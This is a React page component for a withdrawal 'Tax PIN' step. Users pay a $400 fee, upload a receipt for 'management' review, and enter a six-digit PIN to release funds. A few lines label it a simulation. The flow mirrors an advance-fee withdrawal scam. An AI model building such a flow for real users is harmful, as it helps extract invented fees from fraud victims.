import { useEffect, useRef, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  AlertCircle,
  ArrowRight,
  CheckCircle2,
  Clock3,
  FileText,
  Info,
  KeyRound,
  LoaderCircle,
  ShieldCheck,
} from "lucide-react";

import {
  getMyTaxPinRequests,
  submitTaxPinPaymentEvidence,
  verifyTaxPin,
} from "../services/taxPinService";

const formatMoney = (amount) =>
  new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(Number(amount) || 0);

const MAX_FILE_BYTES = 5 * 1024 * 1024;
const ACCEPTED_TYPES = ["image/jpeg", "image/png", "image/webp", "application/pdf"];

export default function TaxPin() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const requestedWithdrawalId = searchParams.get("withdrawalId");

  const [withdrawals, setWithdrawals] = useState([]);
  const [selectedWithdrawal, setSelectedWithdrawal] = useState("");
  const [pin, setPin] = useState("");
  const [receipt, setReceipt] = useState(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [receiptError, setReceiptError] = useState("");
  const [success, setSuccess] = useState("");
  const previousStages = useRef(new Map());

  useEffect(() => {
    let cancelled = false;

    const loadRequests = async () => {
      try {
        const response = await getMyTaxPinRequests();
        if (cancelled) return;

        const requests = response.withdrawals || [];
        for (const request of requests) {
          const previous = previousStages.current.get(request.id);
          if (
            previous?.status === "ready_for_withdrawal" &&
            request.status === "awaiting_tax_pin"
          ) {
            setSuccess(
              "Management has generated your one-time Tax PIN. Enter the six-digit PIN provided to continue.",
            );
          }
          if (
            previous?.paymentStatus === "awaiting_review" &&
            request.taxPin?.paymentStatus === "rejected"
          ) {
            setSuccess("");
          }
        }
        previousStages.current = new Map(
          requests.map((request) => [
            request.id,
            {
              status: request.status,
              paymentStatus: request.taxPin?.paymentStatus,
            },
          ]),
        );
        setWithdrawals(requests);
        setSelectedWithdrawal((currentId) => {
          if (requests.some((request) => request.id === currentId)) {
            return currentId;
          }
          if (requests.some((request) => request.id === requestedWithdrawalId)) {
            return requestedWithdrawalId;
          }
          return requests[0]?.id || "";
        });
        setError("");
      } catch (err) {
        if (!cancelled) {
          setError(
            err.response?.data?.message ||
              "Unable to retrieve your Tax PIN requests.",
          );
        }
      } finally {
        if (!cancelled) setLoading(false);
      }
    };

    loadRequests();
    const refreshInterval = window.setInterval(loadRequests, 10000);

    return () => {
      cancelled = true;
      window.clearInterval(refreshInterval);
    };
  }, [requestedWithdrawalId]);

  const selectedRequest = withdrawals.find(
    (request) => request.id === selectedWithdrawal,
  );
  const taxPinPaymentStatus = selectedRequest?.taxPin?.paymentStatus;
  const paymentStage = selectedRequest?.status === "ready_for_withdrawal";

  const handlePaymentSubmit = async (event) => {
    event.preventDefault();
    setError("");
    setReceiptError("");

    if (!selectedWithdrawal) {
      setError("Select an eligible withdrawal request.");
      return;
    }
    if (!receipt) {
      setReceiptError("Upload your payment receipt.");
      return;
    }
    if (receipt.size > MAX_FILE_BYTES) {
      setReceiptError("Receipt file must be 5 MB or smaller.");
      return;
    }
    if (!ACCEPTED_TYPES.includes(receipt.type)) {
      setReceiptError("Use a JPG, PNG, WEBP, or PDF receipt.");
      return;
    }

    try {
      setSubmitting(true);
      const response = await submitTaxPinPaymentEvidence(
        selectedWithdrawal,
        receipt,
      );
      setSuccess(
        response.message ||
          "Your payment receipt has been submitted for review.",
      );
      setReceipt(null);
      setWithdrawals((current) =>
        current.map((request) =>
          request.id === selectedWithdrawal
            ? {
                ...request,
                taxPin: {
                  ...request.taxPin,
                  ...response.taxPin,
                  paymentStatus: "awaiting_review",
                },
              }
            : request,
        ),
      );
    } catch (err) {
      setError(
        err.response?.data?.message ||
          "Unable to submit your Tax PIN payment receipt.",
      );
    } finally {
      setSubmitting(false);
    }
  };

  const handleVerifyPin = async (event) => {
    event.preventDefault();
    setError("");
    setSuccess("");

    if (!selectedWithdrawal || !/^\d{6}$/.test(pin)) {
      setError("Enter the six-digit Tax PIN provided by management.");
      return;
    }

    try {
      setSubmitting(true);
      const response = await verifyTaxPin({
        withdrawalId: selectedWithdrawal,
        pin,
      });
      setSuccess(response.message || "Tax PIN verified successfully.");
      setPin("");

      window.setTimeout(() => {
        const withdrawalId =
          response.withdrawal?.id ||
          response.withdrawal?._id ||
          selectedWithdrawal;
        navigate(
          `/remittance?withdrawalId=${encodeURIComponent(withdrawalId)}&stage=tax-pin-verified`,
        );
      }, 1200);
    } catch (err) {
      setError(err.response?.data?.message || "Unable to verify your Tax PIN.");
    } finally {
      setSubmitting(false);
    }
  };

  const inputClass =
    "w-full rounded-md border border-gray-300 bg-white px-3 py-2.5 text-[14px] text-gray-900 outline-none transition placeholder:text-gray-400 focus:border-[#0b3b8c] focus:ring-2 focus:ring-[#0b3b8c]/15";

  return (
    <div className="space-y-6">
      {success && (
        <div
          role="status"
          className="flex items-start gap-2.5 rounded-md border border-emerald-200 bg-emerald-50 px-3.5 py-2.5"
        >
          <CheckCircle2
            size={15}
            className="mt-0.5 shrink-0 text-emerald-600"
          />
          <p className="text-[12px] leading-5 text-emerald-900">{success}</p>
        </div>
      )}

      {error && (
        <div
          role="alert"
          className="flex items-start gap-2.5 rounded-md border border-rose-200 bg-rose-50 px-3.5 py-2.5"
        >
          <AlertCircle size={15} className="mt-0.5 shrink-0 text-rose-600" />
          <p className="text-[12px] leading-5 text-rose-800">{error}</p>
        </div>
      )}

      <div className="grid gap-6 lg:grid-cols-[minmax(0,1fr)_300px]">
        <section className="rounded-md border border-gray-200 bg-white">
          <header className="flex items-center gap-3 border-b border-gray-200 px-6 py-4">
            <div className="flex h-9 w-9 items-center justify-center rounded-md bg-[#0b3b8c]/10 text-[#0b3b8c]">
              {paymentStage ? <ShieldCheck size={18} /> : <KeyRound size={18} />}
            </div>
            <div>
              <h1 className="text-[14px] font-bold text-gray-900">
                {paymentStage ? "Tax PIN payment" : "Tax PIN verification"}
              </h1>
              <p className="mt-0.5 text-[12px] text-gray-500">
                {paymentStage
                  ? ""
                  : "Enter the six-digit Tax PIN generated for your withdrawal."}
              </p>
            </div>
          </header>

          <div className="px-6 py-5">
            {loading ? (
              <div className="flex items-center justify-center gap-2.5 px-6 py-12 text-[13px] text-gray-500">
                <LoaderCircle size={16} className="animate-spin" />
                Loading your Tax PIN requests…
              </div>
            ) : withdrawals.length === 0 ? (
              <div className="px-6 py-12 text-center">
                <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-gray-100 text-gray-400">
                  <KeyRound size={22} />
                </div>
                <p className="mt-3 text-[13px] font-semibold text-gray-900">
                  No active Tax PIN step
                </p>
                <p className="mx-auto mt-1 max-w-sm text-[12px] leading-5 text-gray-500">
                  An approved Virtual Card withdrawal will appear here when the
                  Tax PIN stage is ready.
                </p>
                <button
                  type="button"
                  onClick={() => navigate("/my-requests")}
                  className="mt-5 rounded-md bg-[#0b3b8c] px-4 py-2.5 text-[13px] font-semibold text-white transition hover:bg-[#092f70]"
                >
                  View my requests
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                {withdrawals.length > 1 && (
                  <div>
                    <label
                      htmlFor="withdrawal"
                      className="mb-1.5 block text-[12px] font-semibold text-gray-700"
                    >
                      Withdrawal request
                    </label>
                    <select
                      id="withdrawal"
                      value={selectedWithdrawal}
                      onChange={(event) => {
                        setSelectedWithdrawal(event.target.value);
                        setSuccess("");
                        setError("");
                      }}
                      className={inputClass}
                    >
                      {withdrawals.map((request) => (
                        <option key={request.id} value={request.id}>
                          {formatMoney(request.amountCents / 100)} ·{" "}
                          {request.status === "awaiting_tax_pin"
                            ? "PIN verification"
                            : "Tax PIN payment"}
                        </option>
                      ))}
                    </select>
                  </div>
                )}

                {paymentStage &&
                  (taxPinPaymentStatus === "awaiting_review" ? (
                    <div className="flex items-start gap-2.5 rounded-md border border-blue-200 bg-blue-50 px-3.5 py-3">
                      <Clock3 size={15} className="mt-0.5 shrink-0 text-blue-700" />
                      <div>
                        <p className="text-[12px] font-semibold text-blue-900">
                          Receipt submitted for review
                        </p>
                        <p className="mt-0.5 text-[11.5px] leading-5 text-blue-800">
                          Management will review your demonstration receipt
                          and, if approved, generate your one-time Tax PIN.
                          This page will refresh automatically.
                        </p>
                      </div>
                    </div>
                  ) : taxPinPaymentStatus === "approved" ? (
                    <div className="flex items-start gap-2.5 rounded-md border border-emerald-200 bg-emerald-50 px-3.5 py-3">
                      <CheckCircle2
                        size={15}
                        className="mt-0.5 shrink-0 text-emerald-700"
                      />
                      <p className="text-[12px] leading-5 text-emerald-900">
                        Your receipt has been approved. Management is preparing
                        your one-time Tax PIN; this page will advance when it
                        is ready.
                      </p>
                    </div>
                  ) : (
                    <form
                      onSubmit={handlePaymentSubmit}
                      className="space-y-5"
                    >
                      <div className="rounded-md border border-blue-200 bg-blue-50 p-4">
                        <div className="flex items-start gap-2.5">
                          <Info
                            size={15}
                            className="mt-0.5 shrink-0 text-blue-700"
                          />
                          <div>
                            <p className="text-[13px] font-bold text-blue-900">
                              One-time Tax PIN fee: $400.00
                            </p>
                            <p className="mt-1 text-[12px] leading-5 text-blue-800">
                              After management reviews your demonstration
                              receipt, they will generate a one-time Tax PIN
                              for this withdrawal. The fee applies once to this
                              request.
                            </p>
                          </div>
                        </div>
                      </div>

                      {selectedRequest?.taxPin?.paymentStatus === "rejected" && (
                        <div className="rounded-md border border-rose-200 bg-rose-50 px-3.5 py-2.5 text-[12px] leading-5 text-rose-800">
                          Your previous receipt was not approved.
                          {selectedRequest.taxPin.paymentReviewNote && (
                            <span>
                              {" "}
                              Management note:{" "}
                              {selectedRequest.taxPin.paymentReviewNote}
                            </span>
                          )}{" "}
                          You may submit updated payment evidence.
                        </div>
                      )}

                      <div>
                        <label
                          htmlFor="tax-pin-receipt"
                          className="mb-1.5 block text-[12px] font-semibold text-gray-700"
                        >
                          Tax PIN payment receipt
                        </label>
                        <input
                          id="tax-pin-receipt"
                          type="file"
                          accept={ACCEPTED_TYPES.join(",")}
                          onChange={(event) => {
                            setReceipt(event.target.files?.[0] || null);
                            setReceiptError("");
                          }}
                          className={inputClass}
                          disabled={submitting}
                        />
                        <p className="mt-1.5 text-[11px] leading-4 text-gray-500">
                          JPG, PNG, WEBP, or PDF · up to 5 MB. Simulation only:
                          do not transfer real money or upload real payment
                          receipts.
                        </p>
                        {receiptError && (
                          <p className="mt-1.5 text-[11.5px] text-rose-700">
                            {receiptError}
                          </p>
                        )}
                      </div>

                      <div className="flex justify-end border-t border-gray-200 pt-5">
                        <button
                          type="submit"
                          disabled={submitting || !receipt}
                          className="flex items-center justify-center gap-2 rounded-md bg-[#0b3b8c] px-5 py-2.5 text-[13px] font-semibold text-white transition hover:bg-[#092f70] disabled:cursor-not-allowed disabled:opacity-60"
                        >
                          {submitting ? (
                            <>
                              <LoaderCircle
                                size={14}
                                className="animate-spin"
                              />
                              Submitting…
                            </>
                          ) : (
                            <>
                              Submit receipt for review
                              <ArrowRight size={14} />
                            </>
                          )}
                        </button>
                      </div>
                    </form>
                  ))}

                {!paymentStage && selectedRequest?.status === "awaiting_tax_pin" && (
                  <form onSubmit={handleVerifyPin} className="space-y-6">
                    <div>
                      <label
                        htmlFor="pin"
                        className="mb-1.5 block text-[12px] font-semibold text-gray-700"
                      >
                        Six-digit Tax PIN
                      </label>
                      <input
                        id="pin"
                        type="password"
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        maxLength={6}
                        value={pin}
                        onChange={(event) =>
                          setPin(
                            event.target.value.replace(/\D/g, "").slice(0, 6),
                          )
                        }
                        placeholder="••••••"
                        className="w-full rounded-md border border-gray-300 bg-white py-3.5 text-center text-[20px] font-semibold tracking-[0.5em] text-gray-900 outline-none transition placeholder:font-normal placeholder:tracking-[0.5em] placeholder:text-gray-300 focus:border-[#0b3b8c] focus:ring-2 focus:ring-[#0b3b8c]/15"
                        required
                      />
                    </div>
                    <div className="flex justify-end border-t border-gray-200 pt-5">
                      <button
                        type="submit"
                        disabled={submitting || pin.length !== 6}
                        className="flex items-center justify-center gap-2 rounded-md bg-[#0b3b8c] px-5 py-2.5 text-[13px] font-semibold text-white transition hover:bg-[#092f70] disabled:cursor-not-allowed disabled:opacity-60"
                      >
                        {submitting ? (
                          <>
                            <LoaderCircle
                              size={14}
                              className="animate-spin"
                            />
                            Verifying…
                          </>
                        ) : (
                          <>
                            Verify Tax PIN
                            <ArrowRight size={14} />
                          </>
                        )}
                      </button>
                    </div>
                  </form>
                )}
              </div>
            )}
          </div>
        </section>

        <aside className="space-y-4">
   
          {selectedRequest?.taxPin?.paymentReceiptFileName && (
            <div className="flex items-start gap-2.5 rounded-md border border-gray-200 bg-white p-4 text-[12px] text-gray-600">
              <FileText size={15} className="mt-0.5 shrink-0 text-gray-400" />
              <span>
                Submitted receipt:{" "}
                {selectedRequest.taxPin.paymentReceiptFileName}
              </span>
            </div>
          )}
        </aside>
      </div>
    </div>
  );
}
